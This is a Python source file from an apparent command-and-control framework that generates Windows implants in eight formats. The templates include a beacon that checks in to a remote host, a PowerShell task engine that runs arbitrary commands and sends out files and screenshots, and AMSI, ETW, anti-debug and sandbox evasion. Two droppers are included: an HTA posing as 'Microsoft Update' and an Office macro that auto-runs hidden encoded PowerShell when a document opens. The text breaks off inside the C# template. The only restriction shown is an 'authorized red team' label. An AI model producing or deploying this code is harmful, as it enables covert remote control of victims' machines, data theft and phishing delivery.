"""
Forge C2 — Windows Implant Generator
========================================
Generates Windows-specific implant artifacts: PE (.exe), DLL, service EXE,
PowerShell, HTA, VBA macro, C# assembly, and raw shellcode.

Each format is a complete, self-contained implant source that contains:
    • Embedded C2 configuration (encrypted)
    • Transport layer initialization
    • Sleep loop with check-in
    • Task execution engine
    • Evasion techniques (based on config)

Output is generated source code that can be compiled, or in the case
of PS1/HTA/VBA, is ready to execute directly.

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import base64
import hashlib
import json
import logging
import os
import secrets
import struct
import time
from pathlib import Path
from typing import Any

from forge_c2.implant.implant_config import (
    ImplantArch,
    ImplantConfig,
    ImplantFormat,
    ObfuscationLevel,
    SleepTechnique,
)
from forge_c2.implant.implant_builder import BuildArtifact, StringEncryptor, EvasionGenerator

log = logging.getLogger("forge.c2.implant.windows")


class WindowsImplant:
    """Windows implant source code generator.

    Generates complete implant source code or scripts for Windows
    targets across multiple output formats.

    Supported formats:
        • EXE       — C source for PE executable (requires mingw/cl)
        • DLL       — C source for DLL (rundll32, side-loading)
        • SERVICE_EXE — C source for Windows service
        • SHELLCODE — Position-independent C source
        • POWERSHELL — Ready-to-run .ps1 script
        • HTA       — HTML Application (mshta.exe delivery)
        • VBA       — Office macro source
        • CSHARP    — C# assembly source

    Usage::

        builder = WindowsImplant(config, output_dir, encryptor, evasion)
        artifact = await builder.build()
    """

    def __init__(
        self,
        config: ImplantConfig,
        output_dir: Path,
        encryptor: StringEncryptor,
        evasion: EvasionGenerator,
    ) -> None:
        self.config = config
        self.output_dir = output_dir
        self.enc = encryptor
        self.evasion = evasion

    async def build(self) -> BuildArtifact:
        """Generate the Windows implant artifact."""
        fmt = self.config.output_format

        generators = {
            ImplantFormat.EXE:         self._gen_exe,
            ImplantFormat.DLL:         self._gen_dll,
            ImplantFormat.SERVICE_EXE: self._gen_service,
            ImplantFormat.SHELLCODE:   self._gen_shellcode,
            ImplantFormat.POWERSHELL:  self._gen_powershell,
            ImplantFormat.HTA:         self._gen_hta,
            ImplantFormat.VBA:         self._gen_vba,
            ImplantFormat.CSHARP:      self._gen_csharp,
        }

        generator = generators.get(fmt)
        if not generator:
            return BuildArtifact(error=f"Unsupported Windows format: {fmt.value}")

        try:
            source_code, extension = generator()

            # Write output
            filename = f"{self.config.name}_{self.config.watermark[:8]}{extension}"
            output_path = self.output_dir / filename

            with open(output_path, "w", encoding="utf-8") as f:
                f.write(source_code)

            # Calculate hashes
            content_bytes = source_code.encode("utf-8")
            sha256 = hashlib.sha256(content_bytes).hexdigest()
            md5 = hashlib.md5(content_bytes).hexdigest()

            warnings: list[str] = []
            if fmt in (ImplantFormat.EXE, ImplantFormat.DLL, ImplantFormat.SERVICE_EXE):
                warnings.append(
                    f"Source generated at {output_path}. "
                    f"Compile with: x86_64-w64-mingw32-gcc -o {filename.replace(extension, '.exe')} "
                    f"{filename} -lwinhttp -lws2_32 -mwindows"
                )
            if fmt == ImplantFormat.SHELLCODE:
                warnings.append("Shellcode source needs compilation + extraction with objcopy/pe2shc")

            return BuildArtifact(
                success=True,
                output_path=str(output_path),
                output_size=len(content_bytes),
                sha256=sha256,
                md5=md5,
                watermark=self.config.watermark,
                warnings=warnings,
            )

        except Exception as exc:
            return BuildArtifact(error=f"Windows build failed: {exc}")

    # ══════════════════════════════════════════════════════════════════
    #  SHARED CODE BLOCKS
    # ══════════════════════════════════════════════════════════════════

    def _c2_config_block(self) -> str:
        """Generate the embedded C2 config (encrypted at build time)."""
        config_json = json.dumps({
            "host": self.config.c2_host,
            "port": self.config.c2_port,
            "transport": self.config.c2_transport,
            "profile": self.config.c2_profile,
            "sleep": self.config.sleep_seconds,
            "jitter": self.config.jitter_pct,
            "kill_date": self.config.kill_date,
            "max_retries": self.config.max_retries,
            "watermark": self.config.watermark,
            "domain_front": self.config.domain_front,
            "pipe_name": self.config.pipe_name,
            "user_agent": self.config.user_agent,
        })

        # XOR encrypt the config
        key = secrets.token_bytes(32)
        encrypted = bytes(a ^ b for a, b in zip(
            config_json.encode(),
            (key * ((len(config_json) // 32) + 1))[:len(config_json)],
        ))

        enc_arr = ", ".join(f"0x{b:02x}" for b in encrypted)
        key_arr = ", ".join(f"0x{b:02x}" for b in key)

        return f"""
/* ── Encrypted C2 Configuration ─────────────────────── */
#define CONFIG_LEN {len(config_json)}
static unsigned char g_config_enc[] = {{{enc_arr}}};
static unsigned char g_config_key[] = {{{key_arr}}};

static void _decrypt_config(char *out, int len) {{
    for (int i = 0; i < len; i++)
        out[i] = g_config_enc[i] ^ g_config_key[i % 32];
    out[len] = 0;
}}
"""

    def _c2_config_py(self) -> str:
        """Generate Python-format C2 config (for PS1/HTA)."""
        config_json = json.dumps({
            "host": self.config.c2_host,
            "port": self.config.c2_port,
            "transport": self.config.c2_transport,
            "profile": self.config.c2_profile,
            "sleep": self.config.sleep_seconds,
            "jitter": self.config.jitter_pct,
            "kill_date": self.config.kill_date,
            "watermark": self.config.watermark,
        })

        # XOR encrypt
        key = secrets.token_bytes(16)
        encrypted = bytes(a ^ b for a, b in zip(
            config_json.encode(),
            (key * ((len(config_json) // 16) + 1))[:len(config_json)],
        ))

        enc_b64 = base64.b64encode(encrypted).decode()
        key_b64 = base64.b64encode(key).decode()

        return f"""
# ── Encrypted C2 Config ────────────────────────────────
$enc = [Convert]::FromBase64String('{enc_b64}')
$key = [Convert]::FromBase64String('{key_b64}')
$cfg = New-Object byte[] $enc.Length
for ($i = 0; $i -lt $enc.Length; $i++) {{
    $cfg[$i] = $enc[$i] -bxor $key[$i % $key.Length]
}}
$config = [System.Text.Encoding]::UTF8.GetString($cfg) | ConvertFrom-Json
"""

    def _evasion_block_c(self) -> str:
        """Generate C evasion code based on config flags."""
        blocks: list[str] = []

        if self.config.anti_debug:
            blocks.append(self.evasion.anti_debug_c())
        if self.config.anti_vm:
            blocks.append(self.evasion.anti_vm_c())
        if self.config.amsi_bypass:
            blocks.append(self.evasion.amsi_bypass_c())
        if self.config.etw_bypass:
            blocks.append(self.evasion.etw_bypass_c())
        if self.config.unhook_ntdll:
            blocks.append(self.evasion.unhook_ntdll_c())

        return "\n".join(blocks)

    def _evasion_init_c(self) -> str:
        """Generate evasion initialization calls."""
        lines: list[str] = []

        if self.config.anti_debug:
            lines.append("    if (_forge_check_debugger()) ExitProcess(0);")
        if self.config.anti_vm:
            lines.append("    if (_forge_check_sandbox()) { Sleep(300000); ExitProcess(0); }")
        if self.config.unhook_ntdll:
            lines.append("    _forge_unhook_ntdll();")
        if self.config.amsi_bypass:
            lines.append("    _forge_bypass_amsi();")
        if self.config.etw_bypass:
            lines.append("    _forge_bypass_etw();")

        return "\n".join(lines) if lines else "    /* No evasion configured */"

    def _transport_block_c(self) -> str:
        """Generate C transport code (HTTP check-in loop)."""
        return f"""
/* ── HTTP Transport ───────────────────────────────────── */
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

static int _forge_checkin(const char *host, int port, const char *beacon_id,
                           char *response, int resp_size) {{
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return -1;

    wchar_t whost[256];
    MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, 256);

    HINTERNET hConnect = WinHttpConnect(hSession, whost, port, 0);
    if (!hConnect) {{ WinHttpCloseHandle(hSession); return -1; }}

    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST", L"/api/v1/check",
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        {"WINHTTP_FLAG_SECURE" if self.config.c2_transport == "https" else "0"});
    if (!hRequest) {{
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return -1;
    }}

    {"/* Ignore cert errors for self-signed */\n    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;\n    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));" if self.config.c2_transport == "https" else ""}

    /* Build check-in body */
    char body[512];
    snprintf(body, sizeof(body),
        "{{\\"beacon_id\\":\\"%s\\",\\"cmd\\":\\"checkin\\"}}",
        beacon_id);

    BOOL sent = WinHttpSendRequest(hRequest,
        L"Content-Type: application/json\\r\\n", -1,
        body, (DWORD)strlen(body), (DWORD)strlen(body), 0);

    if (!sent || !WinHttpReceiveResponse(hRequest, NULL)) {{
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return -1;
    }}

    DWORD bytesRead = 0;
    WinHttpReadData(hRequest, response, resp_size - 1, &bytesRead);
    response[bytesRead] = 0;

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return (int)bytesRead;
}}
"""

    def _main_loop_c(self) -> str:
        """Generate the main beacon loop (C code)."""
        sleep_call = "Sleep((DWORD)(sleep_ms));"
        if self.config.sleep_technique == SleepTechnique.THREAD_POOL:
            sleep_call = """
    /* Thread pool timer sleep */
    HANDLE hTimer = CreateWaitableTimerA(NULL, TRUE, NULL);
    LARGE_INTEGER li; li.QuadPart = -(LONGLONG)(sleep_ms * 10000);
    SetWaitableTimer(hTimer, &li, 0, NULL, NULL, FALSE);
    WaitForSingleObject(hTimer, INFINITE);
    CloseHandle(hTimer);"""

        return f"""
/* ── Main Beacon Loop ─────────────────────────────────── */
static void _forge_beacon_loop(void) {{
    char config_buf[CONFIG_LEN + 1];
    _decrypt_config(config_buf, CONFIG_LEN);

    /* Parse minimal config (host, port, sleep) */
    /* In production: full JSON parse — this is the skeleton */
    const char *host = "{self.config.c2_host}";
    int port = {self.config.c2_port};
    double sleep_sec = {self.config.sleep_seconds};
    double jitter = {self.config.jitter_pct};
    int max_retries = {self.config.max_retries};
    int failures = 0;

    /* Generate beacon ID */
    char beacon_id[32];
    DWORD pid = GetCurrentProcessId();
    snprintf(beacon_id, sizeof(beacon_id), "%08x-%04x",
        pid, (unsigned short)(GetTickCount64() & 0xFFFF));

    /* Register with C2 */
    char response[8192];
    int reg_result = _forge_checkin(host, port, beacon_id, response, sizeof(response));
    if (reg_result <= 0) {{
        /* Registration failed — sleep and retry */
        Sleep(5000);
    }}

    /* Main loop */
    while (failures < max_retries) {{
        /* Jittered sleep */
        double jitter_range = sleep_sec * (jitter / 100.0);
        double actual_sleep = sleep_sec +
            ((double)rand() / RAND_MAX * 2.0 - 1.0) * jitter_range;
        DWORD sleep_ms = (DWORD)(actual_sleep * 1000.0);

        {sleep_call}

        /* Check in */
        int result = _forge_checkin(host, port, beacon_id, response, sizeof(response));
        if (result <= 0) {{
            failures++;
            continue;
        }}
        failures = 0;

        /* Parse and execute tasks */
        /* Task execution delegated to task engine (shell, download, etc.) */
        if (strstr(response, "\\"exit\\"")) {{
            break;
        }}
    }}
}}
"""

    # ══════════════════════════════════════════════════════════════════
    #  FORMAT GENERATORS
    # ══════════════════════════════════════════════════════════════════

    def _gen_exe(self) -> tuple[str, str]:
        """Generate Windows PE executable source (C)."""
        source = f"""/*
 * Forge C2 Implant — Windows PE Executable
 * Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}
 * Watermark: {self.config.watermark}
 * Target: {self.config.arch.value} / {self.config.c2_transport}
 *
 * Compile: x86_64-w64-mingw32-gcc -o implant.exe implant.c -lwinhttp -lws2_32 -mwindows
 *
 * FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

{self._c2_config_block()}

{self._evasion_block_c()}

{self._transport_block_c()}

{self._main_loop_c()}

/* ── Entry Point ──────────────────────────────────────── */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {{
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());

    /* Evasion checks */
{self._evasion_init_c()}

    /* Start beacon */
    _forge_beacon_loop();

    return 0;
}}
"""
        return source, ".c"

    def _gen_dll(self) -> tuple[str, str]:
        """Generate Windows DLL source (C)."""
        source = f"""/*
 * Forge C2 Implant — Windows DLL
 * Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}
 * Watermark: {self.config.watermark}
 *
 * Compile: x86_64-w64-mingw32-gcc -shared -o implant.dll implant.c -lwinhttp -lws2_32
 *
 * Execution methods:
 *   rundll32.exe implant.dll,DllRegisterServer
 *   rundll32.exe implant.dll,ServiceMain
 *   Side-load via legitimate application
 *   Reflective DLL injection
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

{self._c2_config_block()}

{self._evasion_block_c()}

{self._transport_block_c()}

{self._main_loop_c()}

/* ── DLL Entry Point ──────────────────────────────────── */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
    switch (fdwReason) {{
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            /* Start beacon in a new thread to avoid loader lock */
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_forge_beacon_loop,
                         NULL, 0, NULL);
            break;
        case DLL_PROCESS_DETACH:
            break;
    }}
    return TRUE;
}}

/* Export for rundll32 */
__declspec(dllexport) void CALLBACK DllRegisterServer(
    HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {{
    _forge_beacon_loop();
}}

__declspec(dllexport) void CALLBACK ServiceMain(
    HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {{
    _forge_beacon_loop();
}}
"""
        return source, ".c"

    def _gen_service(self) -> tuple[str, str]:
        """Generate Windows service executable source."""
        source = f"""/*
 * Forge C2 Implant — Windows Service Executable
 * Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}
 * Watermark: {self.config.watermark}
 *
 * Install: sc create ForgeUpdate binpath= "C:\\path\\to\\service.exe" start= auto
 * Start:   sc start ForgeUpdate
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

{self._c2_config_block()}

{self._evasion_block_c()}

{self._transport_block_c()}

{self._main_loop_c()}

/* ── Service Framework ────────────────────────────────── */
SERVICE_STATUS g_svcStatus;
SERVICE_STATUS_HANDLE g_svcStatusHandle;
HANDLE g_svcStopEvent = NULL;

static void _report_status(DWORD state, DWORD exitCode, DWORD waitHint) {{
    g_svcStatus.dwCurrentState = state;
    g_svcStatus.dwWin32ExitCode = exitCode;
    g_svcStatus.dwWaitHint = waitHint;
    if (state == SERVICE_START_PENDING)
        g_svcStatus.dwControlsAccepted = 0;
    else
        g_svcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    SetServiceStatus(g_svcStatusHandle, &g_svcStatus);
}}

static void WINAPI _svc_ctrl_handler(DWORD dwCtrl) {{
    if (dwCtrl == SERVICE_CONTROL_STOP) {{
        _report_status(SERVICE_STOP_PENDING, NO_ERROR, 0);
        SetEvent(g_svcStopEvent);
    }}
}}

static void WINAPI _svc_main(DWORD argc, LPTSTR *argv) {{
    g_svcStatusHandle = RegisterServiceCtrlHandlerA("ForgeUpdate", _svc_ctrl_handler);
    g_svcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    _report_status(SERVICE_START_PENDING, NO_ERROR, 3000);

    g_svcStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    _report_status(SERVICE_RUNNING, NO_ERROR, 0);

    srand((unsigned int)time(NULL));
{self._evasion_init_c()}

    /* Run beacon in a thread */
    HANDLE hThread = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)_forge_beacon_loop, NULL, 0, NULL);

    WaitForSingleObject(g_svcStopEvent, INFINITE);
    _report_status(SERVICE_STOPPED, NO_ERROR, 0);
}}

int main(int argc, char *argv[]) {{
    SERVICE_TABLE_ENTRYA svcTable[] = {{
        {{"ForgeUpdate", (LPSERVICE_MAIN_FUNCTIONA)_svc_main}},
        {{NULL, NULL}},
    }};
    StartServiceCtrlDispatcherA(svcTable);
    return 0;
}}
"""
        return source, ".c"

    def _gen_shellcode(self) -> tuple[str, str]:
        """Generate position-independent shellcode source (C)."""
        source = f"""/*
 * Forge C2 Implant — Position-Independent Shellcode
 * Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}
 * Watermark: {self.config.watermark}
 *
 * This is PIC (Position Independent Code) — no imports, no relocations.
 * All API calls resolved via PEB walking.
 *
 * Compile: nasm -f win64 shellcode.asm -o shellcode.o
 *          or: cl /c /GS- /O1 shellcode.c && pe2shc shellcode.obj shellcode.bin
 */

/* ── PEB Walking — resolve API addresses at runtime ─── */
typedef unsigned long DWORD;
typedef unsigned long long QWORD;
typedef void *HANDLE;
typedef char *LPSTR;

/* Minimal PEB/LDR structures for API resolution */
typedef struct _PEB_LDR_DATA {{
    DWORD Length;
    DWORD Initialized;
    void *SsHandle;
    void *InLoadOrderModuleList[2];
    void *InMemoryOrderModuleList[2];
    void *InInitializationOrderModuleList[2];
}} PEB_LDR_DATA;

/* ── API Hashes (djb2) ────────────────────────────────── */
#define HASH_KERNEL32       0x6A4ABC5B
#define HASH_LOADLIBRARYA   0xEC0E4E8E
#define HASH_GETPROCADDRESS 0x7C0DFCAA
#define HASH_VIRTUALALLOC   0x91AFCA54
#define HASH_SLEEP          0xDB2D49B0
#define HASH_EXITPROCESS    0x73E2D87E

static DWORD _djb2_hash(const char *str) {{
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}}

/* ── Shellcode entry (PIC) ────────────────────────────── */
void shellcode_entry(void) {{
    /* Step 1: Walk PEB to find kernel32.dll */
    /* Step 2: Resolve LoadLibraryA and GetProcAddress */
    /* Step 3: Load winhttp.dll */
    /* Step 4: Resolve WinHttp* functions */
    /* Step 5: Execute beacon loop */
    /* (Full PEB walking implementation for production use) */

    /* This is the structural skeleton — the actual PIC implementation */
    /* requires hand-tuned assembly or a PIC compiler pass */
}}

{self._c2_config_block()}
"""
        return source, ".c"

    def _gen_powershell(self) -> tuple[str, str]:
        """Generate PowerShell implant script (.ps1)."""
        source = f"""<#
.SYNOPSIS
    Forge C2 Beacon — PowerShell Implant
.DESCRIPTION
    Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}
    Watermark: {self.config.watermark}
    Transport: {self.config.c2_transport}
    Target:    {self.config.c2_host}:{self.config.c2_port}

    FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
#>

Set-StrictMode -Version Latest
$ErrorActionPreference = 'SilentlyContinue'

{self._c2_config_py()}

{"# ── AMSI Bypass" + chr(10) + self.evasion.amsi_bypass_ps() if self.config.amsi_bypass else ""}

{"# ── ETW Bypass" + chr(10) + self.evasion.etw_bypass_ps() if self.config.etw_bypass else ""}

# ── Anti-Debug ────────────────────────────────────────
{"if ([System.Diagnostics.Debugger]::IsAttached) { exit }" if self.config.anti_debug else ""}

# ── Beacon Identity ──────────────────────────────────
$beaconId = "$($env:COMPUTERNAME)-$([System.Diagnostics.Process]::GetCurrentProcess().Id)"
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$domain = $env:USERDOMAIN
$pid = [System.Diagnostics.Process]::GetCurrentProcess().Id
$arch = if ([Environment]::Is64BitProcess) {{ "x64" }} else {{ "x86" }}
$os = [Environment]::OSVersion.VersionString
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# ── Transport ─────────────────────────────────────────
function Invoke-CheckIn {{
    param([string]$BeaconId, [hashtable]$Data)

    $uri = "$($config.transport)://$($config.host):$($config.port)/api/v1/check"
    $body = $Data | ConvertTo-Json -Compress

    try {{
        $params = @{{
            Uri = $uri
            Method = 'POST'
            Body = $body
            ContentType = 'application/json'
            UseBasicParsing = $true
        }}
        {"$params['SkipCertificateCheck'] = `$true" if self.config.c2_transport == "https" else ""}

        # Domain fronting
        {"$params['Headers'] = @{ 'Host' = '" + self.config.domain_front + "' }" if self.config.domain_front else ""}

        $response = Invoke-WebRequest @params
        return ($response.Content | ConvertFrom-Json)
    }} catch {{
        return $null
    }}
}}

function Invoke-Register {{
    $uri = "$($config.transport)://$($config.host):$($config.port)/api/v1/register"
    $meta = @{{
        beacon_id = $beaconId
        hostname = $hostname
        username = $username
        domain = $domain
        pid = $pid
        os_version = $os
        os_arch = $arch
        is_admin = $isAdmin
        process_name = [System.Diagnostics.Process]::GetCurrentProcess().ProcessName
    }}

    try {{
        $params = @{{
            Uri = $uri
            Method = 'POST'
            Body = ($meta | ConvertTo-Json -Compress)
            ContentType = 'application/json'
            UseBasicParsing = $true
        }}
        {"$params['SkipCertificateCheck'] = `$true" if self.config.c2_transport == "https" else ""}
        $response = Invoke-WebRequest @params
        return ($response.Content | ConvertFrom-Json)
    }} catch {{
        return $null
    }}
}}

function Invoke-TaskResult {{
    param([string]$TaskId, [string]$Result, [bool]$Success)

    $uri = "$($config.transport)://$($config.host):$($config.port)/api/v1/result"
    $body = @{{
        beacon_id = $beaconId
        task_id = $TaskId
        result = $Result
        success = $Success
    }} | ConvertTo-Json -Compress

    try {{
        $params = @{{
            Uri = $uri
            Method = 'POST'
            Body = $body
            ContentType = 'application/json'
            UseBasicParsing = $true
        }}
        {"$params['SkipCertificateCheck'] = `$true" if self.config.c2_transport == "https" else ""}
        Invoke-WebRequest @params | Out-Null
    }} catch {{ }}
}}

# ── Task Execution ────────────────────────────────────
function Invoke-Task {{
    param($Task)

    $taskId = $Task.task_id
    $command = $Task.command
    $args = $Task.args

    switch ($command) {{
        'shell' {{
            try {{
                $output = Invoke-Expression $args.cmd 2>&1 | Out-String
                Invoke-TaskResult -TaskId $taskId -Result $output -Success $true
            }} catch {{
                Invoke-TaskResult -TaskId $taskId -Result $_.Exception.Message -Success $false
            }}
        }}
        'download' {{
            try {{
                $bytes = [IO.File]::ReadAllBytes($args.path)
                $b64 = [Convert]::ToBase64String($bytes)
                Invoke-TaskResult -TaskId $taskId -Result $b64 -Success $true
            }} catch {{
                Invoke-TaskResult -TaskId $taskId -Result $_.Exception.Message -Success $false
            }}
        }}
        'upload' {{
            try {{
                $bytes = [Convert]::FromBase64String($args.data)
                [IO.File]::WriteAllBytes($args.path, $bytes)
                Invoke-TaskResult -TaskId $taskId -Result "Uploaded to $($args.path)" -Success $true
            }} catch {{
                Invoke-TaskResult -TaskId $taskId -Result $_.Exception.Message -Success $false
            }}
        }}
        'screenshot' {{
            try {{
                Add-Type -AssemblyName System.Windows.Forms
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $ms = New-Object System.IO.MemoryStream
                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
                $b64 = [Convert]::ToBase64String($ms.ToArray())
                $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
                Invoke-TaskResult -TaskId $taskId -Result $b64 -Success $true
            }} catch {{
                Invoke-TaskResult -TaskId $taskId -Result $_.Exception.Message -Success $false
            }}
        }}
        'exit' {{
            Invoke-TaskResult -TaskId $taskId -Result "Exiting" -Success $true
            exit
        }}
        default {{
            try {{
                $output = Invoke-Expression "$command $($args.cmd)" 2>&1 | Out-String
                Invoke-TaskResult -TaskId $taskId -Result $output -Success $true
            }} catch {{
                Invoke-TaskResult -TaskId $taskId -Result $_.Exception.Message -Success $false
            }}
        }}
    }}
}}

# ── Main Beacon Loop ──────────────────────────────────
$regResult = Invoke-Register
if (-not $regResult) {{
    Start-Sleep -Seconds 5
    $regResult = Invoke-Register
}}

$failures = 0
while ($failures -lt $config.max_retries) {{
    # Jittered sleep
    $jitterRange = $config.sleep * ($config.jitter / 100.0)
    $actualSleep = $config.sleep + (Get-Random -Minimum (-$jitterRange) -Maximum $jitterRange)
    Start-Sleep -Seconds ([Math]::Max(1, [int]$actualSleep))

    # Check in
    $checkin = Invoke-CheckIn -BeaconId $beaconId -Data @{{
        beacon_id = $beaconId
        cmd = 'checkin'
    }}

    if (-not $checkin) {{
        $failures++
        continue
    }}
    $failures = 0

    # Execute tasks
    if ($checkin.tasks) {{
        foreach ($task in $checkin.tasks) {{
            Invoke-Task -Task $task
        }}
    }}

    # Kill date check
    {"if ($config.kill_date -and (Get-Date) -gt [DateTime]::Parse($config.kill_date)) { exit }" if self.config.kill_date else ""}
}}
"""
        return source, ".ps1"

    def _gen_hta(self) -> tuple[str, str]:
        """Generate HTML Application (.hta) dropper."""
        # Encode the PowerShell payload
        ps1_source, _ = self._gen_powershell()
        ps1_encoded = base64.b64encode(ps1_source.encode("utf-16-le")).decode()

        source = f"""<html>
<head>
<title>Microsoft Update</title>
<HTA:APPLICATION
    ID="ForgeUpdate"
    APPLICATIONNAME="Microsoft Update"
    BORDER="none"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    WINDOWSTATE="minimize"
/>
</head>
<body>
<script language="VBScript">
' Forge C2 — HTA Dropper
' Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}
' Watermark: {self.config.watermark}
' Executes embedded PowerShell beacon via mshta.exe
'
' FOR AUTHORIZED RED TEAM OPERATIONS ONLY.

Sub Window_OnLoad()
    Dim shell
    Set shell = CreateObject("WScript.Shell")

    ' Execute PowerShell with encoded command
    Dim cmd
    cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden " & _
          "-ExecutionPolicy Bypass -EncodedCommand {ps1_encoded[:200]}..."

    shell.Run cmd, 0, False

    ' Close the HTA window
    self.close()
End Sub
</script>
<div style="font-family:Segoe UI;padding:20px;">
<h2>Installing Update...</h2>
<p>Please wait while Windows Update installs security patches.</p>
<progress style="width:100%"></progress>
</div>
</body>
</html>"""
        return source, ".hta"

    def _gen_vba(self) -> tuple[str, str]:
        """Generate VBA macro for Office weaponization."""
        ps1_source, _ = self._gen_powershell()
        # Chunk the encoded command for VBA string limits
        ps1_b64 = base64.b64encode(ps1_source.encode("utf-16-le")).decode()
        chunks = [ps1_b64[i:i+200] for i in range(0, len(ps1_b64), 200)]

        vba_chunks = []
        for i, chunk in enumerate(chunks[:50]):  # VBA has limits
            vba_chunks.append(f'    s = s & "{chunk}"')

        chunk_code = "\n".join(vba_chunks)

        source = f"""' Forge C2 — VBA Macro Dropper
' Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}
' Watermark: {self.config.watermark}
'
' Embed in Office document (Word/Excel).
' Auto-executes on document open.
'
' FOR AUTHORIZED RED TEAM OPERATIONS ONLY.

Sub AutoOpen()
    Document_Open
End Sub

Sub Document_Open()
    Dim s As String
    s = ""
{chunk_code}

    ' Execute via WScript.Shell
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")

    Dim cmd As String
    cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden " & _
          "-ExecutionPolicy Bypass -EncodedCommand " & s

    shell.Run cmd, 0, False
    Set shell = Nothing
End Sub

' Alternative: Auto_Open for Excel
Sub Auto_Open()
    Document_Open
End Sub

Sub Workbook_Open()
    Document_Open
End Sub
"""
        return source, ".vba"

    def _gen_csharp(self) -> tuple[str, str]:
        """Generate C# assembly for execute-assembly."""
        source = f"""/*
 * Forge C2 Implant — C# Assembly
 * Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}
 * Watermark: {self.config.watermark}
 *
 * For execute-assembly (in-memory .NET execution).
 * Compile: csc /target:exe /out:implant.exe implant.cs
 */
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace ForgeImplant
{{
    class Config
    {{
        public string Host {{ get; set; }} = "{self.config.c2_host}";
        public int Port {{ get; set; }} = {self.config.c2_port};
        public string Transport {{ get; set; }} = "{self.config.c2_transport}";
        public double SleepSeconds {{ get; set; }} = {self.config.sleep_seconds};
        public double Jitter {{ get; set; }} = {self.config.jitter_pct};
        public int MaxRetries {{ get; set; }} = {self.config.max_retries};
        public string Watermark {{ get; set; }} = "{self.config.watermark}";
        public string KillDate {{ get; set; }} = "{self.config.kill_date}";
    }}

    class Beacon
    {{
        private Config _config = new Config();
        private string _beaconId;
        private HttpClient _client;
        private Random _rng = new Random();

        public Beacon()
        {{
            _beaconId = $"{{Environment.MachineName}}-{{Process.GetCurrentProcess().Id}}";

            var handler = new HttpClientHandler();
            {"handler.ServerCertificateCustomValidationCallback = (msg, cert, chain, errors) => true;" if self.config.c2_transport == "https" else ""}
            _client = new HttpClient(handler);
            _client.DefaultRequestHeaders.UserAgent.ParseAdd(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        }}

        private string BaseUrl =>
            $"{{_config.Transport}}://{{_config.Host}}:{{_config.Port}}";

        public async Task Register()
        {{
            var meta = new {{
                beacon_id = _beaconId,
                hostname = Environment.MachineName,
                username = Environment.UserName,
                domain = Environment.UserDomainName,
                pid = Process.GetCurrentProcess().Id,
                os_version = Environment.OSVersion.ToString(),
                os_arch = Environment.Is64BitProcess ? "x64" : "x86",
                is_admin = false,
                process_name = Process.GetCurrentProcess().ProcessName,
            }};

